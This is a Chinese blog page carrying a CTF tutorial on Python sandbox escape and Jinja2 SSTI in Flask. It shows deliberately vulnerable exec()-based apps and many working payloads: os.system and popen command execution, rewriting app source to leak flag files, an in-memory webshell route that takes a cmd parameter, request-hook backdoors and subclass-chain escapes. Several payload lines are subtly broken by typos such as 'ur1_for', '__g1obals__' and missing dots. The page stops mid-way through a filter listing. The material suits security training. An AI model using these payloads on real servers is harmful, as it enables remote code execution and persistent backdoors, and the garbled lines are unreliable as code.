<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>标签: python - xt&#039;s blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="xt&#039;s blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="xt&#039;s blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="xt的个人博客，记录生活、学习、工作中的点点滴滴。"><meta property="og:type" content="blog"><meta property="og:title" content="xt&#039;s blog"><meta property="og:url" content="https://www.xiaotian.org.cn/"><meta property="og:site_name" content="xt&#039;s blog"><meta property="og:description" content="xt的个人博客，记录生活、学习、工作中的点点滴滴。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.xiaotian.org.cn/img/og_image.png"><meta property="article:author" content="xiaotian"><meta property="article:tag" content="xt,blog,个人博客,生活,学习,工作"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://www.xiaotian.org.cn/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.xiaotian.org.cn"},"headline":"xt's blog","image":["https://www.xiaotian.org.cn/img/og_image.png"],"author":{"@type":"Person","name":"xiaotian"},"publisher":{"@type":"Organization","name":"xt's blog","logo":{"@type":"ImageObject","url":"https://www.xiaotian.org.cn/img/logo.svg"}},"description":"xt的个人博客，记录生活、学习、工作中的点点滴滴。"}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/6.0.0/css/all.min.css"><link data-pjax rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/11.7.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdnjs.loli.net/ajax/libs/pace/1.2.4/pace.min.js"></script><!--!--><!--!--><script data-ad-client="ca-pub-2272009624021828" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="xt&#039;s blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/xiaotian2023"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">标签</a></li><li class="is-active"><a href="#" aria-current="page">python</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-03-11T11:49:28.000Z" title="2025/3/11 19:49:28">2025-03-11</time>发表</span><span class="level-item"><time dateTime="2025-05-07T13:10:20.245Z" title="2025/5/7 21:10:20">2025-05-07</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a><span> / </span><a class="link-muted" href="/categories/%E6%8A%80%E6%9C%AF/ctf/">ctf</a><span> / </span><a class="link-muted" href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/">web</a></span><span class="level-item">8 分钟读完 (大约1239个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2025/03/11/python%E6%B2%99%E7%AE%B1%E4%B8%8Essti%E5%85%A5%E9%97%A8/">python沙箱与ssti入门</a></p><div class="content"><h1 id="python沙箱与ssti-jinja2-入门——精简版"><a href="#python沙箱与ssti-jinja2-入门——精简版" class="headerlink" title="python沙箱与ssti(jinja2)入门——精简版"></a>python沙箱与ssti(jinja2)入门——精简版</h1><p>完整版云文档: <a target="_blank" rel="noopener" href="https://doc.weixin.qq.com/doc/w3_AV4A0QaYAIoYb700En5SsqbaVhU4l?scode=APUACwdKABEAMrANAQAV4A0QaYAIo&version=4.1.32.6005&platform=win">https://doc.weixin.qq.com/doc/w3_AV4A0QaYAIoYb700En5SsqbaVhU4l?scode=APUACwdKABEAMrANAQAV4A0QaYAIo&amp;version=4.1.32.6005&amp;platform=win</a></p>
<p>题目练习场：<a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/">https://ctf.xidian.edu.cn/training/</a></p>
<h2 id="python沙箱"><a href="#python沙箱" class="headerlink" title="python沙箱"></a>python沙箱</h2><p>沙箱环境是通过控制和限制代码的执行，保护系统免受恶意代码的危害。在 Flask 应用中，可能会通过如 <code>exec()</code>、<code>eval()</code> 或者其他动态执行代码的方式创建沙箱。这样的操作可能使得恶意用户能够通过注入代码进行远程代码执行 (RCE)。</p>
<h3 id="题目：python沙箱1"><a href="#题目：python沙箱1" class="headerlink" title="题目：python沙箱1"></a>题目：python沙箱1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rce&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rce</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        code = request.form[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">        <span class="built_in">exec</span>(code) <span class="comment">#换成eval()呢？</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;rce.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#思考：要是没有static目录，怎么办？</span></span><br></pre></td></tr></table></figure>

<p>沙箱里有globals()的全局变量与函数</p>
<h4 id="1-写静态目录"><a href="#1-写静态目录" class="headerlink" title="1.写静态目录"></a>1.写静态目录</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os;os.system(<span class="string">&#x27;ls &gt;static/1&#x27;</span>) </span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;&#x27;</span>)<span class="comment">#eval时适用</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Fifker</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;static/test.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(os.popen(<span class="string">&#x27;dir&#x27;</span>).read())</span><br></pre></td></tr></table></figure>

<p>如果没static会写入失败，这时候可以先 <code>mkdir static ; ls &gt;static/1.txt</code></p>
<h4 id="2-写templates-rce-html模板文件"><a href="#2-写templates-rce-html模板文件" class="headerlink" title="2.写templates&#x2F;rce.html模板文件"></a>2.写templates&#x2F;rce.html模板文件</h4><h4 id="3-写app-py热加载"><a href="#3-写app-py热加载" class="headerlink" title="3.写app.py热加载"></a>3.写app.py热加载</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&quot;sed -i \&quot;s/rce.html/`cat /f*`/\&quot; rce.py&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="4-打内存马"><a href="#4-打内存马" class="headerlink" title="4.打内存马"></a>4.打内存马</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app._got_first_request=<span class="literal">False</span>;app.add_url_rule(<span class="string">&#x27;/shell&#x27;</span>,<span class="string">&#x27;shel1&#x27;</span>,<span class="keyword">lambda</span>:<span class="string">&#x27;&lt;pre&gt;&#123;0&#125;&lt;/pre&gt;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>)).read()))</span><br><span class="line"></span><br><span class="line">app.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> x: y <span class="keyword">if</span> <span class="built_in">exec</span>(<span class="string">&#x27;import os;global y;y=make_response(os.popen(&quot;dir&quot;).read())&#x27;</span>)==<span class="literal">None</span> <span class="keyword">else</span> x)</span><br></pre></td></tr></table></figure>

<h4 id="5-利用沙箱中函数的-globals-属性获取-builtins"><a href="#5-利用沙箱中函数的-globals-属性获取-builtins" class="headerlink" title="5.利用沙箱中函数的__globals__属性获取__builtins__"></a>5.利用沙箱中函数的__globals__属性获取__builtins__</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ur1_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_flashed_messages,lipsum.......</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ur1_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None,[])append(lambda resp:CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import __(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;))read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:ur1_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:ur1_for.__g1obals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="6-利用继承关系逃逸"><a href="#6-利用继承关系逃逸" class="headerlink" title="6.利用继承关系逃逸"></a>6.利用继承关系逃逸</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__():</span><br><span class="line">    c+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;wrapper&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(i.__init__):</span><br><span class="line">        <span class="built_in">print</span>(c)</span><br><span class="line">       <span class="comment">#找非wrapper的init函数</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;&#x27;&#x27;.__class__.__base__.__subclasses__()[104].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>os._wrap_close</strong>在os.py里定义，他的init函数globals属性获取到的全局变量与函数包括在os.py里定义的，有system,popen</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>warnings.catch_warnings</strong>类在在内部定义了_module&#x3D;sys.modules[‘warnings’]，然后warnings模块包含有__builtins__(很多模块都包含builtins吧)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&#x27;catch_warnings&#x27;</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;cat ../flag templates/rce.html&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="7-复写函数"><a href="#7-复写函数" class="headerlink" title="7.复写函数"></a>7.复写函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> render_template;render_template=<span class="keyword">lambda</span> x:<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<h3 id="题目：python沙箱2"><a href="#题目：python沙箱2" class="headerlink" title="题目：python沙箱2"></a>题目：python沙箱2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rce&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rce</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        code = request.form[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">        restricted_globals = &#123;</span><br><span class="line">             <span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exec</span>(code, restricted_globals)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;rce.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>沙箱里没有全局变量全局函数（builtin的，flask的都没），利用继承关系逃逸</p>
<h2 id="python-ssti"><a href="#python-ssti" class="headerlink" title="python ssti"></a>python ssti</h2><p><img src="C:\Users\tiand\AppData\Roaming\Typora\typora-user-images\image-20250118152124960.png" alt="image-20250118152124960"></p>
<p>SSTI 是指通过模板引擎（如 Jinja2）执行恶意模板语法，从而导致远程代码执行的漏洞。在 Flask 中，Jinja2 是默认的模板引擎，它的语法允许动态生成 HTML 内容，但不当使用时可能被攻击者利用。</p>
<h3 id="查看flask的jinja2沙箱中globals-全局变量与全局函数"><a href="#查看flask的jinja2沙箱中globals-全局变量与全局函数" class="headerlink" title="查看flask的jinja2沙箱中globals(全局变量与全局函数)"></a>查看flask的jinja2沙箱中globals(全局变量与全局函数)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    jinja_globals = app.jinja_env.<span class="built_in">globals</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(jinja_globals)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;jinja_globals&quot;</span></span><br><span class="line"><span class="comment">#获取沙箱中全局变量全局函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;range&#x27;<span class="punctuation">:</span> &lt;class &#x27;range&#x27;&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;dict&#x27;<span class="punctuation">:</span> &lt;class &#x27;dict&#x27;&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;lipsum&#x27;<span class="punctuation">:</span> &lt;function generate_lorem_ipsum at <span class="number">0x000002049AACD800</span>&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;cycler&#x27;<span class="punctuation">:</span> &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;joiner&#x27;<span class="punctuation">:</span> &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;namespace&#x27;<span class="punctuation">:</span> &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;url_for&#x27;<span class="punctuation">:</span> &lt;bound method Flask.url_for of &lt;Flask &#x27;test&#x27;&gt;&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;get_flashed_messages&#x27;<span class="punctuation">:</span> &lt;function get_flashed_messages at <span class="number">0x000002049B62F740</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"></span><br><span class="line">&#x27;config&#x27;<span class="punctuation">:</span> &lt;Config <span class="punctuation">&#123;</span>&#x27;DEBUG&#x27;<span class="punctuation">:</span> True<span class="punctuation">,</span> &#x27;TESTING&#x27;<span class="punctuation">:</span> False<span class="punctuation">,</span> &#x27;PROPAGATE_EXCEPTIONS&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;SECRET_KEY&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> 		   &#x27;PERMANENT_SESSION_LIFETIME&#x27;<span class="punctuation">:</span> datetime.timedelta(days=<span class="number">31</span>)<span class="punctuation">,</span> &#x27;USE_X_SENDFILE&#x27;<span class="punctuation">:</span> False<span class="punctuation">,</span> &#x27;SERVER_NAME&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;APPLICATION_ROOT&#x27;<span class="punctuation">:</span> &#x27;/&#x27;<span class="punctuation">,</span> &#x27;SESSION_COOKIE_NAME&#x27;<span class="punctuation">:</span> &#x27;session&#x27;<span class="punctuation">,</span> &#x27;SESSION_COOKIE_DOMAIN&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;SESSION_COOKIE_PATH&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;SESSION_COOKIE_HTTPONLY&#x27;<span class="punctuation">:</span> True<span class="punctuation">,</span> &#x27;SESSION_COOKIE_SECURE&#x27;<span class="punctuation">:</span> False<span class="punctuation">,</span> &#x27;SESSION_COOKIE_SAMESITE&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;<span class="punctuation">:</span> True<span class="punctuation">,</span> &#x27;MAX_CONTENT_LENGTH&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;TRAP_HTTP_EXCEPTIONS&#x27;<span class="punctuation">:</span> False<span class="punctuation">,</span> &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;<span class="punctuation">:</span> False<span class="punctuation">,</span> &#x27;PREFERRED_URL_SCHEME&#x27;<span class="punctuation">:</span> &#x27;http&#x27;<span class="punctuation">,</span> &#x27;TEMPLATES_AUTO_RELOAD&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span> &#x27;MAX_COOKIE_SIZE&#x27;<span class="punctuation">:</span> <span class="number">4093</span><span class="punctuation">&#125;</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"></span><br><span class="line">&#x27;request&#x27;<span class="punctuation">:</span> &lt;Request &#x27;http<span class="punctuation">:</span><span class="comment">//127.0.0.1:5000/&#x27; [GET]&gt;, </span></span><br><span class="line">&#x27;session&#x27;<span class="punctuation">:</span> &lt;NullSession <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span>&gt;<span class="punctuation">,</span> </span><br><span class="line">&#x27;g&#x27;<span class="punctuation">:</span> &lt;flask.g of &#x27;test&#x27;&gt;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="查看flask的jinja2沙箱中过滤器"><a href="#查看flask的jinja2沙箱中过滤器" class="headerlink" title="查看flask的jinja2沙箱中过滤器"></a>查看flask的jinja2沙箱中过滤器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    jinja_filters = app.jinja_env.filters</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(jinja_filters)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;jinja_filters&quot;</span></span><br><span class="line"><span class="comment">#获取可用过滤器</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;abs&#x27;<span class="punctuation">:</span> &lt;built-in function abs&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;attr&#x27;<span class="punctuation">:</span> &lt;function do_attr at <span class="number">0x00000216DF1E0180</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;batch&#x27;<span class="punctuation">:</span> &lt;function do_batch at <span class="number">0x00000216DF1DAE80</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;capitalize&#x27;<span class="punctuation">:</span> &lt;function do_capitalize at <span class="number">0x00000216DF1D99E0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;center&#x27;<span class="punctuation">:</span> &lt;function do_center at <span class="number">0x00000216DF1DA020</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;count&#x27;<span class="punctuation">:</span> &lt;built-in function len&gt;<span class="punctuation">,</span> &#x27;d&#x27;<span class="punctuation">:</span> &lt;function do_default at <span class="number">0x00000216DF1D9EE0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;default&#x27;<span class="punctuation">:</span> &lt;function do_default at <span class="number">0x00000216DF1D9EE0</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;dictsort&#x27;<span class="punctuation">:</span> &lt;function do_dictsort at <span class="number">0x00000216DF1D9B20</span>&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;e&#x27;<span class="punctuation">:</span> &lt;built-in function escape&gt;<span class="punctuation">,</span> &#x27;escape&#x27;<span class="punctuation">:</span> &lt;built-in function escape&gt;<span class="punctuation">,</span> </span><br><span class="line"> &#x27;filesizeformat&#x27;<span class="punctuation">:</span> &lt;function do_filesizeformat at <span 